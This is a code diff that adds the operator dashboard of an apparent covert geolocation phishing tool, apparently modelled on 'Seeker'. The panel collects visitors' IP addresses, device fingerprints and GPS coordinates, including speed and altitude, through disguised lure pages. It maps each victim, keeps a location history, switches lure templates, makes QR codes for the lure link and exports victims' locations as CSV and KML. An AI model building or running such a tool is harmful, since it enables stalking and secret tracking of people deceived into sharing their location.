+    }
+  });
+
+  const count = Object.keys(markers).length;
+  document.getElementById('mapCount').textContent = count;
+
+  if (count > 0 && selectedIndex < 0) {
+    try { map.fitBounds(markerGroup.getBounds().pad(0.2)); } catch(e) {}
+  }
+}
+
+function fitAllMarkers() {
+  if (Object.keys(markers).length > 0) {
+    try { map.fitBounds(markerGroup.getBounds().pad(0.2)); } catch(e) {}
+  }
+}
+
+let heatmapOn = false;
+function toggleHeatmap() {
+  heatmapOn = !heatmapOn;
+  toast(heatmapOn ? '热力图模式（开发中）' : '已关闭热力图');
+}
+
+// ===== Detail Panel =====
+function renderDetail(index) {
+  const s = sessions[index];
+  if (!s) return;
+
+  document.getElementById('statsView').style.display = 'none';
+  document.getElementById('sessionDetail').style.display = 'block';
+  document.getElementById('rightTitle').textContent = `会话: ${s.ip}`;
+  document.getElementById('rightTime').textContent = new Date(s.first_seen * 1000).toLocaleString('zh-CN');
+
+  const info = s.info || {};
+  const locs = s.locations || [];
+
+  // Device info
+  const devFields = [
+    ['操作系统', info.os], ['平台', info.platform], ['浏览器', info.browser],
+    ['CPU 核心', info.cores], ['内存', info.ram ? info.ram + ' GB' : null],
+    ['GPU 厂商', info.vendor], ['GPU', info.render],
+    ['分辨率', info.wd && info.ht ? info.wd + 'x' + info.ht : null]
+  ];
+  document.getElementById('devInfo').innerHTML = devFields.map(([l, v]) =>
+    `<div class="info-card"><div class="info-label">${l}</div><div class="info-value">${v || '-'}</div></div>`
+  ).join('');
+
+  // Network info
+  const netFields = [
+    ['IP 地址', info.ip], ['操作系统', info.os], ['浏览器', info.browser],
+    ['屏幕高度', info.ht], ['屏幕宽度', info.wd]
+  ];
+  document.getElementById('netInfo').innerHTML = netFields.map(([l, v]) =>
+    `<div class="info-card"><div class="info-label">${l}</div><div class="info-value">${v || '-'}</div></div>`
+  ).join('');
+
+  // Location info
+  if (locs.length === 0) {
+    document.getElementById('locInfo').innerHTML = '<div style="color:var(--text3);font-size:12px">暂无位置数据</div>';
+    document.getElementById('locHistory').innerHTML = '';
+  } else {
+    const last = locs[locs.length - 1];
+    const lat = parseFloat(last.lat);
+    const lon = parseFloat(last.lon);
+    const gmapsUrl = (!isNaN(lat) && !isNaN(lon))
+      ? `https://www.google.com/maps/place/${lat}+${lon}` : null;
+
+    document.getElementById('locInfo').innerHTML = `
+      <table class="loc-table">
+        <tr><td class="lbl">纬度</td><td class="val">${last.lat || '-'}</td></tr>
+        <tr><td class="lbl">经度</td><td class="val">${last.lon || '-'}</td></tr>
+        <tr><td class="lbl">精度</td><td class="val">${last.acc || '-'}</td></tr>
+        <tr><td class="lbl">海拔</td><td class="val">${last.alt || '-'}</td></tr>
+        <tr><td class="lbl">方向</td><td class="val">${last.dir || '-'}</td></tr>
+        <tr><td class="lbl">速度</td><td class="val">${last.spd || '-'}</td></tr>
+      </table>
+      ${locs.length > 1 ? `<div style="margin-top:6px;font-size:11px;color:var(--text3)">共 ${locs.length} 次位置更新</div>` : ''}
+      ${gmapsUrl ? `<a class="gmaps-btn" href="${gmapsUrl}" target="_blank">&#127758; 在 Google Maps 中查看</a>` : ''}
+    `;
+
+    // Location history
+    const successLocs = locs.filter(l => l.status === 'success');
+    if (successLocs.length > 1) {
+      document.getElementById('locHistory').innerHTML = successLocs.map((l, i) =>
+        `<div style="padding:4px 0;font-size:11px;border-bottom:1px solid var(--border)">
+          <span style="color:var(--text3)">#${i+1}</span>
+          <span style="font-family:monospace;margin-left:6px">${l.lat}, ${l.lon}</span>
+          <span style="color:var(--text3);margin-left:6px">精度: ${l.acc || '-'}</span>
+        </div>`
+      ).join('');
+    } else {
+      document.getElementById('locHistory').innerHTML = '';
+    }
+  }
+
+  // Session event log
+  const logs = [];
+  logs.push({ time: new Date(s.first_seen * 1000), type: 'info', msg: '会话创建' });
+  if (s.info) {
+    logs.push({ time: new Date(s.last_seen * 1000), type: 'info', msg: `设备信息: ${s.info.os || '未知'} / ${s.info.browser || '未知'}` });
+  }
+  locs.forEach((l, i) => {
+    if (l.status === 'success') {
+      logs.push({ time: new Date(), type: 'loc', msg: `位置 #${i+1}: ${l.lat}, ${l.lon} (精度: ${l.acc})` });
+    } else {
+      logs.push({ time: new Date(), type: 'err', msg: `定位失败: ${l.error || '未知错误'}` });
+    }
+  });
+
+  document.getElementById('sessionLog').innerHTML = logs.map(e => {
+    const colors = { info: 'var(--accent)', loc: 'var(--purple)', err: 'var(--red)' };
+    return `<div style="padding:3px 0;border-bottom:1px solid var(--border)">
+      <span style="color:var(--text3)">${e.time.toLocaleTimeString('zh-CN')}</span>
+      <span style="color:${colors[e.type] || 'var(--text)'};margin-left:6px">${e.msg}</span>
+    </div>`;
+  }).join('');
+}
+
+function renderStatsView() {
+  document.getElementById('statsView').style.display = 'block';
+  document.getElementById('sessionDetail').style.display = 'none';
+  document.getElementById('rightTitle').textContent = '统计总览';
+  document.getElementById('rightTime').textContent = '';
+
+  // OS distribution
+  const osMap = {};
+  const brwMap = {};
+  sessions.forEach(s => {
+    const info = s.info || {};
+    const os = info.os || '未知';
+    const brw = info.browser || '未知';
+    osMap[os] = (osMap[os] || 0) + 1;
+    brwMap[brw] = (brwMap[brw] || 0) + 1;
+  });
+
+  document.getElementById('osStats').innerHTML = renderDistribution(osMap);
+  document.getElementById('browserStats').innerHTML = renderDistribution(brwMap);
+
+  // Recent activity
+  const sorted = [...sessions].sort((a, b) => b.last_seen - a.last_seen).slice(0, 5);
+  document.getElementById('recentActivity').innerHTML = sorted.length === 0
+    ? '<div style="color:var(--text3);font-size:12px">暂无活动</div>'
+    : sorted.map(s => {
+        const info = s.info || {};
+        const t = new Date(s.last_seen * 1000).toLocaleString('zh-CN');
+        return `<div style="padding:6px 0;border-bottom:1px solid var(--border);font-size:12px">
+          <span style="font-family:monospace;color:var(--accent)">${s.ip}</span>
+          <span style="color:var(--text2);margin-left:8px">${info.os || '未知'}</span>
+          <span style="color:var(--text3);float:right">${t}</span>
+        </div>`;
+      }).join('');
+}
+
+function renderDistribution(map) {
+  const total = Object.values(map).reduce((a, b) => a + b, 0);
+  if (total === 0) return '<div style="color:var(--text3);font-size:12px">暂无数据</div>';
+  const sorted = Object.entries(map).sort((a, b) => b[1] - a[1]);
+  const colors = ['var(--accent)', 'var(--green)', 'var(--purple)', 'var(--yellow)', 'var(--cyan)', 'var(--orange)'];
+  return sorted.map(([key, val], i) => {
+    const pct = ((val / total) * 100).toFixed(0);
+    return `<div style="margin-bottom:8px">
+      <div style="display:flex;justify-content:space-between;font-size:12px;margin-bottom:3px">
+        <span>${key}</span>
+        <span style="color:var(--text2)">${val} (${pct}%)</span>
+      </div>
+      <div style="height:6px;background:var(--border);border-radius:3px;overflow:hidden">
+        <div style="height:100%;width:${pct}%;background:${colors[i % colors.length]};border-radius:3px;transition:width .3s"></div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ===== Event Logs =====
+function addLog(type, msg) {
+  eventLogs.push({ time: new Date(), type, msg });
+  if (eventLogs.length > 500) eventLogs = eventLogs.slice(-300);
+}
+
+function renderLogs() {
+  const filter = document.getElementById('logFilter').value;
+  const filtered = filter === 'all' ? eventLogs : eventLogs.filter(l => l.type === filter);
+  document.getElementById('logCount').textContent = `${filtered.length} 条记录`;
+
+  const container = document.getElementById('logList');
+  if (filtered.length === 0) {
+    container.innerHTML = '<div class="empty-state"><div class="empty-icon">&#128196;</div><div class="empty-text">暂无日志</div></div>';
+    return;
+  }
+
+  container.innerHTML = filtered.slice().reverse().map(e => {
+    const typeLabels = { info: '设备', loc: '定位', err: '错误', warn: '警告' };
+    return `<div class="log-entry">
+      <span class="log-time">${e.time.toLocaleTimeString('zh-CN')}</span>
+      <span class="log-type log-type-${e.type}">${typeLabels[e.type] || e.type}</span>
+      <span class="log-msg">${e.msg}</span>
+    </div>`;
+  }).join('');
+}
+
+function clearLogs() {
+  eventLogs = [];
+  renderLogs();
+  toast('日志已清空');
+}
+
+// ===== Templates =====
+function renderTemplates() {
+  const grid = document.getElementById('tplGrid');
+  grid.innerHTML = TEMPLATE_META.map(t => {
+    const isActive = t.dir === currentTemplate;
+    return `<div class="tpl-card${isActive ? ' active' : ''}" onclick="selectTemplate(${t.idx})">
+      <div class="tpl-card-header">
+        <div class="tpl-card-icon" style="background:${t.color}20;color:${t.color}">${t.icon}</div>
+        <div>
+          <div class="tpl-card-name">${t.name}</div>
+          <div class="tpl-card-id">${t.dir}</div>
+        </div>
+      </div>
+      <div class="tpl-card-desc">${t.desc}</div>
+      <div class="tpl-card-footer">
+        <div class="tpl-card-tags">${t.tags.map(tag => `<span class="tpl-tag">${tag}</span>`).join('')}</div>
+      </div>
+    </div>`;
+  }).join('');
+
+  // Update current template display
+  const cur = TEMPLATE_META.find(t => t.dir === currentTemplate);
+  if (cur) {
+    document.getElementById('tplCurrentIcon').innerHTML = cur.icon;
+    document.getElementById('tplCurrentIcon').style.background = cur.color + '20';
+    document.getElementById('tplCurrentIcon').style.color = cur.color;
+    document.getElementById('tplCurrentName').textContent = cur.name;
+    document.getElementById('tplCurrentDesc').textContent = cur.desc;
+  }
+}
+
+function selectTemplate(idx) {
+  const t = TEMPLATE_META[idx];
+  if (!t) return;
+  if (t.dir === currentTemplate) {
+    toast('这已经是当前使用的模板');
+    return;
+  }
+  if (confirm(`确认切换到「${t.name}」模板？\n\n这将重新生成伪装页面。`)) {
+    fetch('/api/template', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ template: idx })
+    })
+    .then(r => r.json())
+    .then(data => {
+      if (data.status === 'ok') {
+        currentTemplate = t.dir;
+        renderTemplates();
+        toast(`已切换到「${t.name}」`, 'success');
+      } else {
+        toast('切换失败: ' + (data.error || '未知错误'), 'error');
+      }
+    })
+    .catch(() => toast('切换失败: 服务器无响应', 'error'));
+  }
+}
+
+// ===== Utilities =====
+function copyLink() {
+  const url = window.location.origin + '/';
+  navigator.clipboard.writeText(url).then(() => {
+    toast('链接已复制: ' + url, 'success');
+  }).catch(() => {
+    toast('复制失败，请手动复制', 'error');
+  });
+}
+
+function showQR() {
+  const url = window.location.origin + '/';
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
+  document.getElementById('qrArea').innerHTML = `<img src="${qrUrl}" alt="QR Code" style="width:200px;height:200px">`;
+  document.getElementById('qrModal').classList.add('show');
+}
+
+function closeModal(id) {
+  document.getElementById(id).classList.remove('show');
+}
+
+function exportData() {
+  let csv = 'IP,OS,Platform,Browser,CPU,RAM,GPU,Resolution,Latitude,Longitude,Accuracy,Altitude,Direction,Speed\n';
+  sessions.forEach(s => {
+    const info = s.info || {};
+    const locs = s.locations || [];
+    const lastLoc = locs.filter(l => l.status === 'success').pop();
+    csv += `"${s.ip}","${info.os||''}","${info.platform||''}","${info.browser||''}","${info.cores||''}","${info.ram||''}","${info.render||''}","${info.wd||''}x${info.ht||''}",`;
+    if (lastLoc) {
+      csv += `"${lastLoc.lat||''}","${lastLoc.lon||''}","${lastLoc.acc||''}","${lastLoc.alt||''}","${lastLoc.dir||''}","${lastLoc.spd||''}"`;
+    } else {
+      csv += ',,,,,';
+    }
+    csv += '\n';
+  });
+
+  const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `seeker_data_${new Date().toISOString().slice(0,10)}.csv`;
+  a.click();
+  URL.revokeObjectURL(url);
+  toast('数据已导出', 'success');
+}
+
+function exportKML() {
+  let kml = '<?xml version="1.0" encoding="UTF-8"?>\n<kml xmlns="http://www.opengis.net/kml/2.2">\n<Document>\n<name>Seeker Locations</name>\n';
+  sessions.forEach(s => {
+    const locs = (s.locations || []).filter(l => l.status === 'success');
+    locs.forEach((l, i) => {
+      const lat = parseFloat(l.lat);
+      const lon = parseFloat(l.lon);
+      if (!isNaN(lat) && !isNaN(lon)) {
+        kml += `<Placemark><name>${s.ip} #${i+1}</name><Point><coordinates>${lon},${lat},0</coordinates></Point></Placemark>\n`;
+      }
+    });
+  });
+  kml += '</Document>\n</kml>';
+
+  const blob = new Blob([kml], { type: 'application/vnd.google-earth.kml+xml' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `seeker_${new Date().toISOString().slice(0,10)}.kml`;
+  a.click();
+  URL.revokeObjectURL(url);
+  toast('KML 文件已导出', 'success');
+}
+
+function confirmClear() {
+  if (confirm('确认清空所有会话数据？此操作不可撤销。')) {
+    toast('此功能需要重启服务来清空数据', 'error');
+  }
+}
+
+function toast(msg, type) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = 'toast show ' + (type || '');
+  setTimeout(() => el.classList.remove('show'), 3000);
+}
+
+// ===== Uptime Timer =====
+setInterval(() => {
+  const elapsed = Math.floor((Date.now() - startTime) / 1000);
+  const h = Math.floor(elapsed / 3600);
+  const m = Math.floor((elapsed % 3600) / 60);
+  const s = elapsed % 60;
+  document.getElementById('setUptime').textContent =
+    `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+}, 1000);
+
+// ===== Init =====
+window.addEventListener('load', () => {
+  initMap();
+  renderTemplates();
+  renderLogs();
+  fetchSessions();
+  setInterval(fetchSessions, 3000);
+
+  // Detect current template from page source or URL
+  fetch('/api/config')
+    .then(r => r.json())
+    .then(data => {
+      currentTemplate = data.template || '';
+      document.getElementById('setPort').textContent = data.port || '8080';
+      document.getElementById('setTunnel').textContent = data.tunnel || '-';
+      document.getElementById('setLocalUrl').textContent = data.local_url || '-';
+      document.getElementById('setPublicUrl').textContent = data.public_url || '-';
+      document.getElementById('setRedirect').value = data.redirect || '';
+      renderTemplates();
+    })
+    .catch(() => {
+      currentTemplate = 'news_breaking';
+      renderTemplates();
+    });
+});
+
+// Close modal on outside click
+document.getElementById('qrModal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal('qrModal');
+});
+</script>
+</body>
+</html>
